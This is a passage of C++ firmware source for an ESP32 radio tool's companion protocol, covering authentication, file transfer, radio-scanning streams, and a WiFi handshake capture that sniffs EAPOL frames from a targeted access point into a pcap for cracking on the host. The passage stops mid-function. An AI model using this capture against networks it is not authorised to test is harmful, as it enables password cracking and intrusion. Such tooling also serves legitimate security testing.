#include "companion.h"
#include "FramingSerialDevice.h"
#include "core/display.h"
#include "core/serial_commands/cli.h"
#include "core/sd_functions.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <Esp.h>
#include <FS.h>
#include <WiFi.h>
#include <cstring>
#include <esp_random.h>
#include <esp_wifi.h>
#include <freertos/queue.h>
#include <globals.h>
#include <mbedtls/base64.h>
#include <mbedtls/sha256.h>
#include <modules/NRF24/nrf_common.h>
#include <modules/rf/rf_utils.h>

#ifndef BRUCE_VERSION
#define BRUCE_VERSION "dev"
#endif

#if !defined(LITE_VERSION)
// Defined in settings.cpp. Forward-declared here to avoid including the
// widely-included settings.h (keeps incremental rebuilds small).
void enableBLEAPI();
bool isBLEAPIEnabled();
extern SerialDevice *bleApiSerial; // BLE serial device (companion over BLE)
#endif

namespace {

FramingSerialDevice g_framing(nullptr);
bool g_authed = false;

// --- challenge-response auth state ---
// When a token is configured, HELLO issues a random nonce; the host must answer
// with AUTH resp=sha256(token ":" nonceHex). The token itself never crosses the
// link (BLE is unencrypted). Nonce is one-shot. Auth is reset on BLE disconnect.
uint8_t g_nonce[16];
bool g_haveNonce = false;

// anti-brute: lock out AUTH after too many failures for a cool-down window
int g_authFails = 0;
uint32_t g_authLockUntil = 0;
const int AUTH_MAX_FAILS = 5;
const uint32_t AUTH_LOCK_MS = 30000;

// Per-frame reply transport (so USB and BLE sessions coexist). emit() targets
// g_reply when set, else the global serialDevice. g_streamReply is the stream's
// owning transport (captured at stream start).
SerialDevice *g_reply = nullptr;
SerialDevice *g_streamReply = nullptr;

// --- async streaming state (drained in companion::tick, serial-task context) ---
bool g_streaming = false;
uint32_t g_streamId = 0;
uint32_t g_streamSeq = 0;
uint32_t g_streamLastMs = 0;
uint32_t g_streamInterval = 1000;
String g_streamKind = "";
const char *g_radioOwner = "none"; // none | ui | companion
bool g_nrfReady = false;           // NRF24 powered up for an nrf stream
bool g_rfReady = false;            // CC1101 powered up for an rf stream
float g_rfStart = 433.0f, g_rfStop = 434.8f; // sub-GHz sweep band (MHz)

// --- capture-to-file state ----------------------------------------------------
// Same sweep machinery as streaming, but each data frame is written to a file on
// storage instead of being emitted live; only a light progress EVT goes over the
// wire. The capture survives a host disconnect (key win for slow BLE links): the
// host later reconnects, `companion capture stop`, then `companion file get`.
// File format matches the host save_stream(): a "# kind:" header followed by one
// EVT-payload per line, so analyze_stream_file() parses captures unchanged.
bool g_capturing = false;
File g_capFile;
String g_capPath;
uint32_t g_capBytes = 0;
uint32_t g_capSamples = 0;
uint32_t g_capProgMs = 0;
mbedtls_sha256_context g_capCtx;

// --- handshake (WiFi packet) capture state -----------------------------------
// A "handshake" capture is a packet capture, not a sweep: WiFi runs in
// promiscuous mode and the rx callback COPIES matching frames (beacons/probe-
// responses for the SSID + EAPOL data frames) into a queue. companion::tick()
// drains the queue and writes a libpcap (DLT 105) file — so no SD I/O happens in
// the WiFi-driver callback context. Reuses the capture file/sha/byte infra so
// stop/status/file-get all work unchanged; the host cracks the fetched pcap.
struct HsPkt {
    uint16_t len;
    uint32_t ts_sec, ts_us;
    uint8_t data[256]; // EAPOL frames are ~155 B; beacons truncated (SSID is early)
};
QueueHandle_t g_hsQueue = nullptr;
bool g_hsActive = false;
uint32_t g_hsDrop = 0; // best-effort dropped-frame counter (queue full)
const uint8_t g_hsChannels[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10};
int g_hsChanIdx = 0;
uint8_t g_hsFixedCh = 0; // 0 = hop across g_hsChannels
uint32_t g_hsHopMs = 0;
uint8_t g_hsBssid[6] = {0};
bool g_hsHaveBssid = false; // when set, only frames to/from this BSSID are kept
const uint8_t EAPOL_LLC[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};

String buildCaps() {
    String c = "wifi,rf,ir,nrf,gpio,crypto,storage,status,gps,util,settings,power";
#ifdef USB_as_HID
    c += ",badusb";
#endif
#ifndef LITE_VERSION
    c += ",js";
#endif
#ifdef HAS_SCREEN
    c += ",screen";
#endif
#if defined(HAS_NS4168_SPKR) || defined(BUZZ_PIN)
    c += ",sound";
#endif
    return c;
}

// Extract value of "key=" from a payload, reading until the next space.
String fieldValue(const String &payload, const String &key) {
    int i = payload.indexOf(key + "=");
    if (i < 0) return "";
    i += key.length() + 1;
    int e = payload.indexOf(' ', i);
    if (e < 0) e = payload.length();
    return payload.substring(i, e);
}

// Parse "AA:BB:CC:DD:EE:FF" (or with '-') into 6 bytes. Returns false on bad input.
bool parseMac(const String &s, uint8_t out[6]) {
    int n = 0;
    uint8_t b = 0;
    int nib = 0;
    for (size_t i = 0; i < s.length() && n < 6; i++) {
        char c = s[i];
        if (c == ':' || c == '-') continue;
        int v;
        if (c >= '0' && c <= '9') v = c - '0';
        else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') v = c - 'A' + 10;
        else return false;
        b = (b << 4) | v;
        if (++nib == 2) {
            out[n++] = b;
            b = 0;
            nib = 0;
        }
    }
    return n == 6;
}

// Emit one raw frame line to the real transport (the current global device).
void emit(const String &frame) {
    SerialDevice *dev = g_reply ? g_reply : serialDevice;
    if (dev) dev->println(frame);
}

// Low-level capture write: append to the file, fold into the running sha256, and
// count bytes. Used for both the header and the data lines so the stop-RSP sha
// covers the whole file (host cross-checks it after `file get`).
void capWrite(const String &s) {
    if (!g_capFile) return;
    g_capFile.print(s); // not println(): avoid \r\n, host expects bare \n
    mbedtls_sha256_update(&g_capCtx, (const uint8_t *)s.c_str(), s.length());
    g_capBytes += s.length();
}

// Sink for one stream/capture data frame. The sweep emitters build just the
// payload (everything that would follow "EVT <id> ") and call this: live streams
// wrap it in an EVT frame to the wire; captures append it to the file.
void emitData(const String &payload) {
    if (g_capturing) {
        capWrite(payload + "\n");
        g_capSamples++;
    } else {
        emit("EVT " + String(g_streamId) + " " + payload);
    }
}

// Binary capture write (for the pcap handshake capture): same sha/byte folding
// as capWrite but raw bytes (NUL-safe), so the stop-RSP sha covers the file.
void capWriteBin(const uint8_t *d, size_t n) {
    if (!g_capFile) return;
    g_capFile.write(d, n);
    mbedtls_sha256_update(&g_capCtx, d, n);
    g_capBytes += n;
}

// libpcap global header: magic a1b2c3d4, v2.4, snaplen 65535, network 105
// (DLT_IEEE802_11). ESP32 is little-endian so memcpy yields the LE byte order
// the host wpa_crack reader expects.
void hsPcapGlobalHeader() {
    uint8_t h[24];
    uint32_t magic = 0xA1B2C3D4, zero = 0, snap = 65535, net = 105;
    uint16_t vmaj = 2, vmin = 4;
    memcpy(h, &magic, 4);
    memcpy(h + 4, &vmaj, 2);
    memcpy(h + 6, &vmin, 2);
    memcpy(h + 8, &zero, 4);
    memcpy(h + 12, &zero, 4);
    memcpy(h + 16, &snap, 4);
    memcpy(h + 20, &net, 4);
    capWriteBin(h, 24);
}

void hsWritePkt(const HsPkt &q) {
    uint8_t rh[16];
    uint32_t l = q.len;
    memcpy(rh, &q.ts_sec, 4);
    memcpy(rh + 4, &q.ts_us, 4);
    memcpy(rh + 8, &l, 4);  // incl_len
    memcpy(rh + 12, &l, 4); // orig_len (we cap at sizeof data; truncation is benign)
    capWriteBin(rh, 16);
    capWriteBin(q.data, q.len);
}

// Promiscuous rx callback — runs in WiFi-driver context, so it does NO SD I/O:
// it only filters (beacon/probe-resp + EAPOL) and copies the frame into a queue.
void hsPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_hsActive || !g_hsQueue) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    uint16_t fc = p[0] | (p[1] << 8);
    int ftype = (fc >> 2) & 3, subtype = (fc >> 4) & 0xF;
    bool keep = false;
    if (ftype == 0 && (subtype == 8 || subtype == 5)) {
        keep = true; // beacon / probe-response — carries the SSID
    } else if (ftype == 2) {
        int off = 24;
        if (subtype & 0x08) off += 2; // QoS data has a 2-byte QoS Control field
        if (len >= (uint32_t)off + 8 && memcmp(p + off, EAPOL_LLC, 8) == 0) keep = true;
    }
    if (!keep) return;
    // Optional BSSID filter: keep only frames involving the target AP (any of the
    // three 802.11 addresses matches), so a busy band doesn't bloat the pcap.
    if (g_hsHaveBssid && len >= 22) {
        if (memcmp(p + 4, g_hsBssid, 6) != 0 && memcmp(p + 10, g_hsBssid, 6) != 0 &&
            memcmp(p + 16, g_hsBssid, 6) != 0)
            return;
    }
    HsPkt q;
    q.len = len > sizeof(q.data) ? (uint16_t)sizeof(q.data) : (uint16_t)len;
    uint32_t us = pkt->rx_ctrl.timestamp;
    q.ts_sec = us / 1000000;
    q.ts_us = us % 1000000;
    memcpy(q.data, p, q.len);
    if (xQueueSend(g_hsQueue, &q, 0) != pdTRUE) g_hsDrop++;
}

String toHex(const uint8_t *d, size_t n) {
    static const char *h = "0123456789abcdef";
    String s;
    s.reserve(n * 2);
    for (size_t i = 0; i < n; i++) {
        s += h[d[i] >> 4];
        s += h[d[i] & 0xf];
    }
    return s;
}

String sha256Hex(const String &in) {
    uint8_t h[32];
    mbedtls_sha256_context c;
    mbedtls_sha256_init(&c);
    mbedtls_sha256_starts(&c, 0);
    mbedtls_sha256_update(&c, (const uint8_t *)in.c_str(), in.length());
    mbedtls_sha256_finish(&c, h);
    mbedtls_sha256_free(&c);
    return toHex(h, 32);
}

// Path = text up to the first " size=" / " sha256=" / " chunk=" marker (so
// paths may contain spaces, e.g. "System Volume Information").
String extractPath(const String &rest) {
    int cut = rest.length();
    const char *keys[] = {" size=", " sha256=", " chunk="};
    for (const char *k : keys) {
        int i = rest.indexOf(k);
        if (i >= 0 && i < cut) cut = i;
    }
    String p = rest.substring(0, cut);
    p.trim();
    return p;
}

int clampChunk(const String &rest) {
    int chunk = 512;
    String cv = fieldValue(rest, "chunk");
    if (cv.length()) chunk = cv.toInt();
    if (chunk < 16) chunk = 16;
    if (chunk > 1024) chunk = 1024;
    return chunk;
}

// ---- file get (device -> host): metadata RSP, EVT chunks (base64), sha256 ----
void doFileGet(uint32_t id, const String &rest) {
    int chunk = clampChunk(rest);
    String path = extractPath(rest);
    FS *fs;
    if (!getFsStorage(fs) || !fs->exists(path)) {
        emit("ERR " + String(id) + " 4 no such file");
        return;
    }
    File f = fs->open(path);
    if (!f || f.isDirectory()) {
        if (f) f.close();
        emit("ERR " + String(id) + " 4 cannot open");
        return;
    }
    size_t size = f.size();
    size_t nchunks = (size + chunk - 1) / chunk;
    emit("RSP " + String(id) + " size=" + String((uint32_t)size) + " chunks=" +
         String((uint32_t)nchunks) + " chunk_size=" + String(chunk));

    mbedtls_sha256_context ctx;
    mbedtls_sha256_init(&ctx);
    mbedtls_sha256_starts(&ctx, 0);
    size_t b64cap = 4 * ((chunk + 2) / 3) + 1;
    uint8_t *buf = (uint8_t *)malloc(chunk);
    uint8_t *b64 = (uint8_t *)malloc(b64cap);
    if (!buf || !b64) {
        free(buf);
        free(b64);
        f.close();
        mbedtls_sha256_free(&ctx);
        emit("ERR " + String(id) + " 4 oom");
        return;
    }
    uint32_t n = 0;
    int r;
    while ((r = f.read(buf, chunk)) > 0) {
        mbedtls_sha256_update(&ctx, buf, r);
        size_t olen = 0;
        mbedtls_base64_encode(b64, b64cap, &olen, buf, r);
        String s;
        s.reserve(olen);
        for (size_t i = 0; i < olen; i++) s += (char)b64[i];
        emit("EVT " + String(id) + " chunk " + String(n) + " " + s);
        n++;
    }
    uint8_t hash[32];
    mbedtls_sha256_finish(&ctx, hash);
    mbedtls_sha256_free(&ctx);
    free(buf);
    free(b64);
    f.close();
    emit("RSP " + String(id) + " sha256=" + toHex(hash, 32));
    emit("END " + String(id) + " 0");
}

// ---- file put (host -> device): session + acked chunks + sha256 verify ----
struct PutSession {
    bool active = false;
    File f;
    String expSha;
    size_t written = 0;
    mbedtls_sha256_context ctx;
} g_put;

void doFilePutStart(uint32_t id, const String &rest) {
    if (g_put.active) {
        emit("ERR " + String(id) + " 2 put in progress");
        return;
    }
    int chunk = clampChunk(rest);
    String path = extractPath(rest);
    FS *fs;
    if (!getFsStorage(fs)) {
        emit("ERR " + String(id) + " 4 no fs");
        return;
    }
    g_put.f = fs->open(path, FILE_WRITE, true);
    if (!g_put.f) {
        emit("ERR " + String(id) + " 4 cannot create");
        return;
    }
    g_put.active = true;
    g_put.expSha = fieldValue(rest, "sha256");
    g_put.written = 0;
    mbedtls_sha256_init(&g_put.ctx);
    mbedtls_sha256_starts(&g_put.ctx, 0);
    emit("RSP " + String(id) + " ready chunk_size=" + String(chunk));
    emit("END " + String(id) + " 0");
}

void doFilePutChunk(uint32_t id, const String &rest) {
    if (!g_put.active) {
        emit("ERR " + String(id) + " 4 no put session");
        return;
    }
    int sp = rest.indexOf(' '); // skip the <n> index
    String b64 = (sp < 0) ? String("") : rest.substring(sp + 1);
    b64.trim();
    size_t dcap = (b64.length() / 4 + 1) * 3 + 4;
    uint8_t *dst = (uint8_t *)malloc(dcap);
    if (!dst) {
        emit("ERR " + String(id) + " 4 oom");
        return;
    }
    size_t olen = 0;
    int rc = mbedtls_base64_decode(dst, dcap, &olen, (const uint8_t *)b64.c_str(), b64.length());
    if (rc != 0) {
        free(dst);
        emit("ERR " + String(id) + " 6 bad base64");
        return;
    }
    g_put.f.write(dst, olen);
    mbedtls_sha256_update(&g_put.ctx, dst, olen);
    g_put.written += olen;
    free(dst);
    emit("END " + String(id) + " 0"); // ack
}

void doFilePutEnd(uint32_t id) {
    if (!g_put.active) {
        emit("ERR " + String(id) + " 4 no put session");
        return;
    }
    g_put.f.close();
    uint8_t hash[32];
    mbedtls_sha256_finish(&g_put.ctx, hash);
    mbedtls_sha256_free(&g_put.ctx);
    String got = toHex(hash, 32);
    bool ok = (g_put.expSha.length() == 0) || got.equalsIgnoreCase(g_put.expSha);
    g_put.active = false;
    emit("RSP " + String(id) + " written=" + String((uint32_t)g_put.written) + " sha256=" + got +
         " ok=" + String(ok ? "true" : "false"));
    emit("END " + String(id) + " " + String(ok ? 0 : 4));
}

// ---- real radio stream kinds (wifi / nrf) -------------------------------------

const char *wifiEncStr(int enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "open";
        case WIFI_AUTH_WEP: return "wep";
        case WIFI_AUTH_WPA_PSK: return "wpa";
        case WIFI_AUTH_WPA2_PSK: return "wpa2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "wpa/wpa2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "wpa2-ent";
#ifdef WIFI_AUTH_WPA3_PSK
        case WIFI_AUTH_WPA3_PSK: return "wpa3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "wpa2/wpa3";
#endif
        default: return "?";
    }
}

// WiFi stream uses the async scan API so the serial task never blocks: kick a
// scan, poll scanComplete() each tick, emit one EVT per network when ready,
// then idle until the interval elapses before re-scanning. SPI-safe (WiFi has
// its own radio peripheral; no shared bus with the display).
void tickWifi(uint32_t now) {
    int16_t st = WiFi.scanComplete();
    if (st == WIFI_SCAN_RUNNING) return;
    if (st >= 0) {
        emitData("wifi seq=" + String(g_streamSeq) + " count=" + String(st) + " ms=" + String(now));
        int n = st > 40 ? 40 : st; // cap frames per sweep
        for (int i = 0; i < n; i++) {
            String ssid = WiFi.SSID(i);
            ssid.replace('\r', ' ');
            ssid.replace('\n', ' '); // never break framing
            emitData("wifi net ch=" + String(WiFi.channel(i)) + " rssi=" + String(WiFi.RSSI(i)) +
                     " enc=" + String(wifiEncStr(WiFi.encryptionType(i))) +
                     " bssid=" + WiFi.BSSIDstr(i) + " ssid=" + (ssid.length() ? ssid : String("<hidden>")));
        }
        WiFi.scanDelete();
        g_streamSeq++;
        g_streamLastMs = now; // hold off the next scan until the interval passes
        return;
    }
    // st == WIFI_SCAN_FAILED (-2): idle -> (re)start a scan when due
    if (g_streamLastMs == 0 || (now - g_streamLastMs) >= g_streamInterval) {
        if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
        WiFi.scanNetworks(true); // async (non-blocking)
        g_streamLastMs = now;
    }
}

bool nrfStreamBegin() {
    if (!nrf_start(NRF_MODE_SPI)) return false;
    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();       // accept any carrier
    NRFradio.setAddressWidth(2); // reverse-engineering tactic (see nrf_spectrum)
    const uint8_t noise[][2] = {{0x55, 0x55}, {0xAA, 0xAA}, {0xA0, 0xAA},
                                {0xAB, 0xAA}, {0xAC, 0xAA}, {0xAD, 0xAA}};
    for (uint8_t i = 0; i < 6; ++i) NRFradio.openReadingPipe(i, noise[i]);
    NRFradio.setDataRate(RF24_1MBPS);
    g_nrfReady = true;
    return true;
}

// One RPD spectrum sweep over the 2.4 GHz band (80 channels), a few samples per
// channel. Fast (~tens of ms). NOTE: on T-Embed the NRF24 shares the TFT SPI
// bus, so keep the device screen idle while streaming nrf (no SPI mutex exists).
void emitNrfSweep(uint32_t now) {
    const int CH = 80;
    const int SAMPLES = 3;
    String active;
    int peakCh = -1, peakHits = 0, total = 0;
    for (int c = 0; c < CH; c++) {
        NRFradio.setChannel(c);
        int hits = 0;
        for (int s = 0; s < SAMPLES; s++) {
            NRFradio.startListening();
            delayMicroseconds(130);
            NRFradio.stopListening();
            if (NRFradio.testRPD()) hits++;
        }
        if (hits > 0) {
            if (active.length()) active += ",";
            active += String(c) + ":" + String(hits);
            total++;
            if (hits > peakHits) {
                peakHits = hits;
                peakCh = c;
            }
        }
    }
    emitData("nrf seq=" + String(g_streamSeq) + " ms=" + String(now) + " channels=" + String(CH) +
             " active_n=" + String(total) + " peak_ch=" + String(peakCh) + " peak=" +
             String(peakHits) + " active=" + (active.length() ? active : String("none")));
}

bool rfStreamBegin(float start, float stop) {
    // Validate against the CC1101 bands; fall back to the 433 ISM band.
    auto ok = [](float f) {
        return (f >= 280 && f <= 350) || (f >= 387 && f <= 468) || (f >= 779 && f <= 928);
    };
    if (!ok(start) || !ok(stop) || stop <= start) {
        start = 433.0f;
        stop = 434.8f;
    }
    g_rfStart = start;
    g_rfStop = stop;
    if (!initRfModule("rx", start)) return false;
    ELECHOUSE_cc1101.setRxBW(200); // narrow RxBW for cleaner RSSI (matches rf_waterfall)
    g_rfReady = true;
    return true;
}

// One sub-GHz RSSI sweep across [g_rfStart, g_rfStop] (40 bins). Mirrors the
// rf_waterfall arbitration (dummy TFT pixel) for the shared SPI bus. Keep the
// device screen idle while streaming rf.
void emitRfSweep(uint32_t now) {
    const int N = 40;
    float step = (g_rfStop - g_rfStart) / (float)(N - 1);
    String rssis;
    int peak = -200, peakIdx = 0, floor_ = 200;
    for (int i = 0; i < N; i++) {
        float f = g_rfStart + step * i;
        setMHZ(f);
        ELECHOUSE_cc1101.SetRx();            // re-strobe RX so the synth recalibrates
                                             // at the new freq and RSSI becomes valid
        tft.drawPixel(0, 0, 0);              // SPI arbitration on the shared bus
        vTaskDelay(2 / portTICK_PERIOD_MS);  // yield + let RSSI settle (avoids 0x80)
        int r = ELECHOUSE_cc1101.getRssi();
        tft.drawPixel(0, 0, 0);              // re-sync after the status read
        if (i) rssis += ",";
        rssis += String(r);
        if (r > peak) { peak = r; peakIdx = i; }
        if (r < floor_) floor_ = r;
    }
    float peakF = g_rfStart + step * peakIdx;
    emitData("rf seq=" + String(g_streamSeq) + " ms=" + String(now) + " f0=" + String(g_rfStart, 2) +
             " f1=" + String(g_rfStop, 2) + " step=" + String(step, 3) + " n=" + String(N) +
             " peak_f=" + String(peakF, 2) + " peak=" + String(peak) + " floor=" + String(floor_) +
             " rssi=" + rssis);
}

void streamTeardown() {
    if (g_hsActive) {
        esp_wifi_set_promiscuous(false);
        g_hsActive = false;
        if (g_hsQueue) {
            vQueueDelete(g_hsQueue);
            g_hsQueue = nullptr;
        }
    }
    if (g_streamKind == "wifi") {
        int16_t st = WiFi.scanComplete();
        if (st >= 0) WiFi.scanDelete();
    }
    if (g_nrfReady) {
        NRFradio.stopListening();
        NRFradio.powerDown();
        g_nrfReady = false;
    }
    if (g_rfReady) {
        deinitRfModule();
        g_rfReady = false;
    }
}

} // namespace

namespace companion {

bool looksLikeFrame(const String &line) {
    return line.startsWith("REQ ") || line.startsWith("ACK ");
}

// Drop the authenticated session (call on BLE disconnect so the next central
// must re-authenticate; otherwise it would inherit the previous auth state).
void resetAuth() {
    g_authed = false;
    g_haveNonce = false;
    // A capture-to-file deliberately SURVIVES a host disconnect (that's its whole
    // point on slow BLE links): keep it running, just detach its progress-EVT
    // transport so we don't write to a torn-down BLE link (emit() then falls back
    // to USB, which is harmless). A live stream, by contrast, is torn down.
    if (g_capturing) {
        g_streamReply = nullptr;
    } else {
        streamTeardown(); // release wifi/nrf radios if a stream was active
        g_streaming = false;
        g_streamReply = nullptr;
        g_radioOwner = "none";
    }
}

void handleLine(SerialCli &cli, const String &raw, SerialDevice *reply) {
    g_reply = reply ? reply : serialDevice; // route this frame's replies back
    String line = raw;
    line.trim();

    int s1 = line.indexOf(' ');
    if (s1 < 0) {
        emit("ERR 0 6 BADFRAME");
        return;
    }
    String type = line.substring(0, s1);
    String rest = line.substring(s1 + 1);
    rest.trim();

    int s2 = rest.indexOf(' ');
    String idStr = (s2 < 0) ? rest : rest.substring(0, s2);
    String payload = (s2 < 0) ? String("") : rest.substring(s2 + 1);
    payload.trim();
    uint32_t id = (uint32_t)idStr.toInt();

    if (type == "ACK") return; // host flow-control, ignored in v1
    if (type != "REQ") {
        emit("ERR " + String(id) + " 6 BADFRAME");
        return;
    }

    // --- HELLO / authentication (challenge-response) ---
    if (payload.startsWith("HELLO")) {
        bool overBle = false;
#if !defined(LITE_VERSION)
        // "over the air" = this frame arrived on the BLE transport (USB stays
        // open even while BLE is enabled, so check the reply device, not just
        // whether BLE is up).
        overBle = (g_reply != nullptr && g_reply == bleApiSerial);
#endif
        const String &tokenCfg = bruceConfig.companionToken;
        String helloInfo = "fw=Treecataje/" + String(BRUCE_VERSION) +
                           " proto=1 board=T_EMBED_CC1101 mtu=512 name=Bruc";

        if (tokenCfg.length() == 0) {
            // Open mode: only over the wired USB link. Over the air (BLE) a
            // token MUST be configured first — this is the radio-control lock.
            if (overBle) {
                emit("ERR " + String(id) + " 7 AUTH token-required-for-ble");
                return;
            }
            g_authed = true;
            g_haveNonce = false;
            emit("RSP " + String(id) + " " + helloInfo + " auth=open");
            emit("RSP " + String(id) + " caps=" + buildCaps());
            emit("END " + String(id) + " 0");
            return;
        }

        // Token configured: issue a fresh one-shot challenge; the host must
        // follow with AUTH resp=sha256(token ":" nonce). Not authed yet.
        esp_fill_random(g_nonce, sizeof(g_nonce));
        g_haveNonce = true;
        g_authed = false;
        emit("RSP " + String(id) + " " + helloInfo + " auth=required");
        emit("RSP " + String(id) + " nonce=" + toHex(g_nonce, sizeof(g_nonce)));
        emit("END " + String(id) + " 0");
        return;
    }

    // --- AUTH: answer to the HELLO challenge (with anti-brute lockout) ---
    if (payload.startsWith("AUTH")) {
        uint32_t now = millis();
        if (g_authLockUntil && now < g_authLockUntil) {
            emit("ERR " + String(id) + " 7 AUTH locked retry_ms=" + String(g_authLockUntil - now));
            return;
        }
        if (!g_haveNonce) {
            emit("ERR " + String(id) + " 7 AUTH no-challenge");
            return;
        }
        String resp = fieldValue(payload, "resp");
        String expect = sha256Hex(bruceConfig.companionToken + ":" + toHex(g_nonce, sizeof(g_nonce)));
        g_haveNonce = false; // one-shot, even on failure (forces a new HELLO)
        if (resp.length() && resp.equalsIgnoreCase(expect)) {
            g_authed = true;
            g_authFails = 0;
            emit("RSP " + String(id) + " ok auth=ok");
            emit("RSP " + String(id) + " caps=" + buildCaps());
            emit("END " + String(id) + " 0");
        } else {
            g_authed = false;
            if (++g_authFails >= AUTH_MAX_FAILS) {
                g_authLockUntil = now + AUTH_LOCK_MS;
                g_authFails = 0;
                emit("ERR " + String(id) + " 7 AUTH locked retry_ms=" + String(AUTH_LOCK_MS));
            } else {
                emit("ERR " + String(id) + " 7 AUTH");
            }
        }
        return;
    }

    if (!g_authed) {
        emit("ERR " + String(id) + " 7 AUTH");
        return;
    }

    // --- token management (only over an already-authed session) ---
    if (payload.startsWith("companion token set ")) {
        String t = payload.substring(20);
        t.trim();
        bruceConfig.companionToken = t;
        bruceConfig.saveFile();
        emit("RSP " + String(id) + " token=set len=" + String(t.length()));
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload == "companion token clear") {
        bruceConfig.companionToken = "";
        bruceConfig.saveFile();
        emit("RSP " + String(id) + " token=cleared");
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload == "companion token status") {
        emit("RSP " + String(id) + " token_set=" +
             String(bruceConfig.companionToken.length() ? "true" : "false"));
        emit("END " + String(id) + " 0");
        return;
    }

    // --- companion-specific verbs ---
    if (payload == "companion caps") {
        emit("RSP " + String(id) + " caps=" + buildCaps());
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload == "companion busy") {
        String act = "";
        if (g_capturing) act = " capture=" + g_streamKind + " id=" + String(g_streamId);
        else if (g_streaming) act = " stream=" + g_streamKind + " id=" + String(g_streamId);
        emit("RSP " + String(id) + " owner=" + String(g_radioOwner) + act);
        emit("END " + String(id) + " 0");
        return;
    }
    // --- streaming: start/stop async EVT (drained in tick()) ---
    if (payload.startsWith("companion stream start")) {
        String spec = payload.substring(String("companion stream start").length());
        spec.trim();
        if (spec.length() == 0) spec = "telemetry";
        if (g_streaming) {
            emit("ERR " + String(id) + " 2 stream already active id=" + String(g_streamId));
            return;
        }
        // base kind = first token; the rest carries optional args (rf range,
        // interval=<ms>).
        String kind = spec;
        String rest = "";
        int sp = spec.indexOf(' ');
        if (sp > 0) {
            kind = spec.substring(0, sp);
            rest = spec.substring(sp + 1);
            rest.trim();
        }
        if (kind != "telemetry" && kind != "wifi" && kind != "nrf" && kind != "rf") {
            emit("ERR " + String(id) + " 3 unknown stream kind=" + kind);
            return;
        }
        // optional interval override (interval=<ms>), else default 1 Hz
        g_streamInterval = 1000;
        String iv = fieldValue(spec, "interval");
        if (iv.length()) {
            long v = iv.toInt();
            if (v < 200) v = 200;
            if (v > 10000) v = 10000;
            g_streamInterval = (uint32_t)v;
        }
        // Per-kind radio init (must succeed before we mark the stream active).
        if (kind == "wifi") {
            if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
        } else if (kind == "nrf") {
            if (!nrfStreamBegin()) {
                emit("ERR " + String(id) + " 4 nrf init failed (radio not found?)");
                return;
            }
        } else if (kind == "rf") {
            float a = g_rfStart, b = g_rfStop;
            int s2 = rest.indexOf(' ');
            if (s2 > 0) {  // "rf <start> <stop>"
                a = rest.substring(0, s2).toFloat();
                b = rest.substring(s2 + 1).toFloat();
            }
            if (!rfStreamBegin(a, b)) {
                emit("ERR " + String(id) + " 4 rf init failed (CC1101 not found?)");
                return;
            }
        }
        g_streaming = true;
        g_streamId = id;
        g_streamSeq = 0;
        g_streamKind = kind;
        g_streamLastMs = 0; // emit first tick immediately
        g_streamReply = g_reply; // EVTs go back to the transport that started it
        g_radioOwner = "companion";
        emit("RSP " + String(id) + " streaming=" + kind + " id=" + String(id) +
             " interval=" + String(g_streamInterval) +
             (kind == "rf" ? " band=" + String(g_rfStart, 2) + "-" + String(g_rfStop, 2) : ""));
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload.startsWith("companion stream stop")) {
        streamTeardown();
        g_streaming = false;
        g_radioOwner = "none";
        emit("RSP " + String(id) + " stopped=" + String(g_streamId));
        emit("END " + String(id) + " 0");
        return;
    }
    // --- capture-to-file: same sweeps, but data is logged to SD; survives a host
    // disconnect. Stop, then `companion file get`, then host analyze_stream_file. ---
    if (payload.startsWith("companion capture status")) {
        if (g_capturing) {
            emit("RSP " + String(id) + " capturing=" + g_streamKind + " path=" + g_capPath +
                 " samples=" + String(g_capSamples) + " bytes=" + String(g_capBytes) + " seq=" +
                 String(g_streamSeq));
        } else {
            emit("RSP " + String(id) + " capturing=none");
        }
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload.startsWith("companion capture stop")) {
        if (!g_capturing) {
            emit("ERR " + String(id) + " 2 no capture active");
            return;
        }
        uint8_t hash[32];
        mbedtls_sha256_finish(&g_capCtx, hash);
        mbedtls_sha256_free(&g_capCtx);
        if (g_capFile) g_capFile.close();
        streamTeardown();
        g_capturing = false;
        g_streaming = false;
        g_radioOwner = "none";
        emit("RSP " + String(id) + " captured path=" + g_capPath + " bytes=" + String(g_capBytes) +
             " samples=" + String(g_capSamples) + " sha256=" + toHex(hash, 32));
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload.startsWith("companion capture start")) {
        String spec = payload.substring(String("companion capture start").length());
        spec.trim();
        if (spec.length() == 0) spec = "telemetry";
        if (g_streaming || g_capturing) {
            emit("ERR " + String(id) + " 2 capture/stream already active id=" + String(g_streamId));
            return;
        }
        String kind = spec;
        String rest = "";
        int sp = spec.indexOf(' ');
        if (sp > 0) {
            kind = spec.substring(0, sp);
            rest = spec.substring(sp + 1);
            rest.trim();
        }
        if (kind != "telemetry" && kind != "wifi" && kind != "nrf" && kind != "rf" &&
            kind != "handshake") {
            emit("ERR " + String(id) + " 3 unknown capture kind=" + kind);
            return;
        }
        g_streamInterval = 1000;
        String iv = fieldValue(spec, "interval");
        if (iv.length()) {
            long v = iv.toInt();
            if (v < 200) v = 200;
            if (v > 10000) v = 10000;
            g_streamInterval = (uint32_t)v;
        }
        // Per-kind radio init (mirrors stream start; must succeed before opening
        // the file so we don't leave an empty capture on failure).
        if (kind == "wifi") {
            if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
